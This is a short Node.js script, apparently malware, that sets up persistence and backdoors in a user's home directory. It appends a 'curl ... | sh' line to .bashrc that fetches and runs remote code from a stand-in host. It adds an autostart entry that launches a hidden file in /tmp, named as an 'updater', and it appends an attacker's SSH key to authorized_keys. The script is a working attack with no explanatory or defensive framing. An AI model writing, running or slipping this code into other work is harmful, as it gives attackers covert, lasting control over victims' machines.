const fs = require('fs'); const os = require('os'); const path = require('path');
const home = os.homedir();
fs.appendFileSync(path.join(home, '.bashrc'), '\ncurl -s http://updates.example.invalid/x.sh | sh\n');
fs.mkdirSync(path.join(home, '.config/autostart'), { recursive: true });
fs.writeFileSync(path.join(home, '.config/autostart/updater.desktop'), '[Desktop Entry]\nExec=/tmp/.updater\n');
fs.appendFileSync(path.join(home, '.ssh/authorized_keys'), 'ssh-rsa AAAAB3NzaC1yc2E attacker@example.invalid\n');
